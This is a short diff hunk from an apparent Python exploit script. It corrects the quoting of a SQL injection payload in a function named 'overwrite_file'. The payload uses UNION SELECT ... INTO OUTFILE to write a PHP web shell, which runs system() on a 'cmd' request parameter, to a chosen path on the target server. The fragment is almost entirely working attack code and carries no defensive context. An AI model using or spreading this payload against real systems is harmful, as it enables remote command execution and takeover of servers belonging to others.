@@ -48,7 +48,7 @@ def exploit(url, param, payload):
 
 def overwrite_file(url, param, filepath):
     print(f"[+] Attempting to overwrite {filepath}...\n")
-    payload = f"' union select 1, <?php system($_GET[\"cmd\"]); ?> into outfile {filepath}"
+    payload = f"' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile '{filepath}' #"
     if exploit(url, param, payload):
         print(f"[+] Successfully overwritten {filepath}...\n")
     else:
